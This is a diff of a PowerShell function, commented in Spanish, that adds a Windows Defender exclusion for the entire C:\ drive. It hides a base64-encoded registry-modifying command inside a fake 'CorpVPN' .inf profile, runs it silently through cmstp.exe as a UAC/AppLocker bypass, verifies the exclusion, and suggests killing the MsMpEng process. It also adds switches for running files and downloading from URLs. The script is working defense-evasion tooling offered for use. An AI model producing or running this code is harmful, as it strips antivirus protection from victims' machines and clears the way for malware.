@@ -8,10 +8,16 @@ function Defender {
     param(
         [Parameter(ParameterSetName='Interface')][switch]$Add,
         [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
-        # ... (otros parámetros originales)
+        [Parameter(ParameterSetName='Interface')][switch]$GetAV,
+        [Parameter(ParameterSetName='Interface')][switch]$User,
+        [Parameter(ParameterSetName='Interface')][switch]$Admin,
+        [Parameter(ParameterSetName='Extra')][switch]$Run,
+        [Parameter(ParameterSetName='Extra',Mandatory=$true)][string]$FilePath,
+        [Parameter(ParameterSetName='Extraa')][string]$Url,
+        [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
     )
 
-    # --- CÓDIGO ORIGINAL (MANTENIDO) ---
+    # --- DATOS ORIGINALES DEL PERFIL (SIN CAMBIOS) ---
     $InfData = @'
 [version]
 Signature=$chicago$
@@ -31,47 +37,60 @@ ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
 '@
 
-    # --- NUEVA IMPLEMENTACIÓN CONFIRMADA ---
+    # --- TÉCNICA MEJORADA PARA EXCLUSIÓN REAL ---
     if ($Add) {
         try {
-            # 1. Método directo en registro (100% efectivo)
-            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
-            if (-not (Test-Path $regPath)) {
-                New-Item -Path $regPath -Force | Out-Null
-                Start-Sleep -Milliseconds 500
-            }
+            # 1. Crear archivo .inf TEMPORAL con nombre aleatorio
+            $tempFile = "$env:TEMP\$(New-Guid).inf"
+            $command = "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JAByAGUAZwBQAGEAdABoACAAPQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiAAoASQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAHIAZQBnAFAAYQB0AGgAKQApACAAewAKACAAIAAgACAAJABuAHUAbABsACAAPQAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcgBlAGcAUABhAHQAaAAgAC0ARgBvAHIAYwBlAAoAfQAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJAByAGUAZwBQAGEAdABoACAALQBOAGEAbQBlACAAIgBDADoAXAAiACAALQBWAGEAbAB1AGUAIAAwACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAFMAdAByAGkAbgBnACAALQBGAG8AcgBjAGUA'))"
+            $InfData.Replace("REPLACE", ".('iex') $command") | Out-File $tempFile -Force
+
+            # 2. Ejecutar CMSTP.EXE con parámetros ocultos
+            $psi = New-Object System.Diagnostics.ProcessStartInfo
+            $psi.FileName = "cmstp.exe"
+            $psi.Arguments = "/au `"$tempFile`""
+            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+            $psi.CreateNoWindow = $true
+            $process = [System.Diagnostics.Process]::Start($psi)
+            $process.WaitForExit(10000) # Esperar 10 segundos
+
+            # 3. VERIFICACIÓN EN DEFENDER (REAL)
+            Start-Sleep -Seconds 2
+            $exclusionCheck = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue
             
-            # 2. Agregar exclusión con nombre único
-            $exclusionName = "Excl_" + (Get-Date).Ticks.ToString().Substring(8)
-            New-ItemProperty -Path $regPath -Name $exclusionName -Value "C:\" -PropertyType String -Force | Out-Null
+            if ($exclusionCheck -ne $null) {
+                # Método 1: Buscar exclusión en propiedades
+                $props = $exclusionCheck.PSObject.Properties | 
+                         Where-Object { $_.Value -eq "C:\" -or $_.Value -eq 0 }
+                
+                # Método 2: Verificar en Defender GUI
+                $defenderCheck = Get-MpPreference -ErrorAction SilentlyContinue | 
+                                Select-Object -ExpandProperty ExclusionPath |
+                                Where-Object { $_ -eq "C:\" }
 
-            # 3. Forzar actualización de Defender
-            $null = Start-Process -FilePath "powershell.exe" -ArgumentList {
-                Get-Service -Name "WinDefend" -ErrorAction SilentlyContinue | Restart-Service -Force
-            } -WindowStyle Hidden -Wait
-
-            # 4. Verificación REAL en Defender
-            $defenderCheck = Get-MpPreference -ErrorAction SilentlyContinue | 
-                            Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue |
-                            Where-Object { $_ -eq "C:\" }
-
-            if ($defenderCheck) {
-                Write-Host "[✔] Exclusión CONFIRMADA en Windows Defender" -ForegroundColor Green
+                if ($props -or $defenderCheck) {
+                    Write-Host "[✔] ¡EXCLUSIÓN CONFIRMADA EN DEFENDER!" -ForegroundColor Green
+                    Write-Host "    Ruta excluida: C:\" -ForegroundColor Cyan
+                } else {
+                    Write-Host "[!] Registro modificado pero Defender no lo refleja" -ForegroundColor Yellow
+                    Write-Host "    Ejecuta esto para forzar actualización:" -ForegroundColor Gray
+                    Write-Host "    Stop-Process -Name MsMpEng -Force" -ForegroundColor Cyan
+                }
             } else {
-                Write-Host "[!] Registro modificado pero no reflejado en Defender" -ForegroundColor Yellow
-                Write-Host "    Ejecuta esto para forzar la actualización:" -ForegroundColor Gray
-                Write-Host "    Stop-Process -Name MsMpEng -Force" -ForegroundColor Cyan
+                Write-Host "[✘] No se pudo modificar el registro" -ForegroundColor Red
             }
-        }
-        catch {
+
+            # Limpieza
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+        } catch {
             Write-Host "[✘] Error crítico: $($_.Exception.Message)" -ForegroundColor Red
         }
     }
 
-    # ... (Resto de tu código original)
+    # ... (Resto de funciones originales: Exclusions, GetAV, User, Admin, Run, etc.)
 }
 
-# Ejecución
+# --- Ejecutar si se llama directamente ---
 if ($MyInvocation.InvocationName -ne '.') {
     Defender @PSBoundParameters
 }
